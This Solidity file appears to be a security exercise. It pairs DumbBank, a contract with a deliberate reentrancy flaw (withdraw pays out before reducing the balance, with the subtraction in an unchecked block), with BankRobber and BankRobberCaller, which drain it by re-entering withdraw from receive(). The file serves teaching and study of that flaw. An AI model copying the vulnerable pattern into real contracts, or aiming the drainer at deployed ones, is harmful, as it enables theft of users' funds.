pragma solidity 0.8.15;

import "forge-std/console.sol";

contract DumbBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= balances[msg.sender], "not enough funds");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface IDumbBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract BankRobber {
    IDumbBank dumbBank;

    constructor(IDumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
        BankRobberCaller caller = new BankRobberCaller(dumbBank);
        caller.callRobber{value: 1 ether}();
    }
}

contract BankRobberCaller {
    IDumbBank dumbBank;

    constructor(IDumbBank _dumbBank) {
        dumbBank = _dumbBank;
    }

    function callRobber() public payable {
        dumbBank.deposit{value: 1 ether}();
        dumbBank.withdraw(1 ether);
    }

    receive() external payable {
        if (address(dumbBank).balance >= 1 ether) {
            dumbBank.withdraw(1 ether);
        }
    }
}
